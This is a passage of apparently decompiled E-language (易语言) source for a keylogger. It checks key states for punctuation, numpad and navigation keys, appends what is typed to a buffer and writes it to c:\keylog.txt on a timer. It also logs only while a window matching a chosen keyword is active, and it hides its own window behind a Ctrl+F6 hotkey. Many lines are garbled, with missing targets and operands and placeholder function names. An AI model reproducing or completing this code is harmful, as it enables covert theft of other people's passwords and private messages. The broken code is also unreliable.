.如果真 (并且 (不等于 (位与 (1), 0), 等于 (真)))
    赋值 (相加 (“{”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (221))
.如果真 (并且 (不等于 (位与 (1), 0), 不等于 (真)))
    赋值 (相加 (“]”))
.如果真结束
.如果真 (并且 (不等于 (位与 (1), 0), 等于 (真)))
    赋值 (相加 (“}”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (220))
.如果真 (并且 (不等于 (位与 (1), 0), 不等于 (真)))
    赋值 (相加 (“\”))
.如果真结束
.如果真 (并且 (不等于 (位与 (1), 0), 等于 (真)))
    赋值 (相加 (“|”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (222))
.如果真 (并且 (不等于 (位与 (1), 0), 不等于 (真)))
    赋值 (相加 (“'”))
.如果真结束
.如果真 (并且 (不等于 (位与 (1), 0), 等于 (真)))
    赋值 (相加 (#引号))
.如果真结束
赋值 (keystate, 未知函数_167837765 (96))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“0”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (97))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“1”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (98))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“2”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (99))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“3”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (100))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“4”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (101))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“5”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (102))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“6”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (103))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“7”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (104))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“8”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (105))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“9”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (110))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“删除”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (111))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“/”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (106))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“*”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (107))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“+”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (109))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“-”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (13))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“回车”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (36))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“行头”))
.如果真结束
赋值 (keystate, 未知函数_167837765 (35))
.如果真 (并且 (是否可记录, 不等于 (位与 (keystate, 1), 0)))
    赋值 (相加 (“行尾”))
.如果真结束


.子程序 _存储记录时钟_周期事件, 空白型, , 
.局部变量 文件号, 整数型, , , 
.局部变量 文件内容, 字节集, , , 

.如果真 (不等于 (“”))
    赋值 (文件号, 打开文件 (“c:\keylog.txt”, #改写, ))
    .如果 (不等于 (文件号, 0))
        移到文件尾 (文件号)
        写出字节集 (文件号, 到字节集 (记录文本))
        赋值 (“”)
    .否则
        
    .如果结束
    关闭文件 (文件号)
.如果真结束


.子程序 _按钮3_被单击, 空白型, , 
运行 (相加 (读环境变量 (“windir”), “\notepad.exe c:\keylog.txt”), 假, )

.子程序 _按钮1_被单击, 空白型, , 
赋值 (特征词, .)
.如果 (等于 (特征词, “”))
    信息框 (“请填写所要监视的窗口的特征词，如不明白，请看使用说明。”, 16, )
    返回 ()
.否则
    
.如果结束
.如果 (等于 (., 0))
    赋值 (., 1)
    赋值 (., 3000)
    赋值 (., “停止记录”)
.否则
    赋值 (., 0)
    赋值 (., 0)
    赋值 (., “开始记录”)
.如果结束


.子程序 _编辑框2_获得焦点, 空白型, , 
 ' 以下语句使得编辑框2不被修改。
获取焦点 ()

.子程序 呼出窗口, 空白型, , 
撤消程序热键 ()
赋值 (_启动窗口., 真)
赋值 (背景窗口., 真)

.子程序 _按钮2_被单击, 空白型, , 
注册程序热键 (_启动窗口.取窗口句柄 (), 2, #F6键, &呼出窗口)
信息框 (“程序即将隐藏窗口，用热键CTRL+F6即可显示窗口！”, 48, “提示”)
赋值 (_启动窗口., 假)
赋值 (背景窗口., 假)
热键注册完毕 ()

.子程序 _按钮5_被单击, 空白型, , 
写到文件 (“c:\keylog.txt”, 到字节集 (“”))
信息框 (“记录已清空！”, 48, )

.程序集 _模块_注册系统热键1.0, , , ** 不要更改此处 hotkey.ec

.子程序 注册程序热键, 整数型, , 
.参数 窗口句柄, 整数型, , 程序窗口句柄
.参数 功能键, 整数型, , 可以为：0-无功能键；1-ALT键；2-CTRL键；4-SHIFT键或各键值之和
.参数 主热键, 整数型, , 键代码，可以使用易语言中的键代码常量
.参数 响应子程序, 子程序指针, , 热键所对应的子程序指针，注意该子程序不能带有参数。在易中可以用无参数子程序间接调用带参数的子程序。

 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 热键注册完毕, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.子程序 撤消程序热键, 空白型, , 
 ' ** 本子程序功能由系统自动转交对应模块实现，可以删除但不能修改。

.窗口程序集 窗口程序集2, , , 

.子程序 _时钟1_周期事件, 空白型, , 
赋值 (背景窗口., 相加 (_启动窗口., _启动窗口.., 3))
赋值 (背景窗口., 相加 (_启动窗口., _启动窗口.., 22))

.子程序 _背景窗口_创建完毕, 空白型, , 
.局部变量 主句柄, 整数型, , , 
.局部变量 风格, 整数型, , , 

赋值 (主句柄, 背景窗口.取窗口句柄 ())
赋值 (风格, 未知函数_167837833 (-20))
赋值 (风格, 位或 (风格, 524288))
未知函数_167837834 (-20, 风格)
设置透明 (主句柄, 0, 100, 2)


 ' 不属于任何一个程序集、类模块的函数：
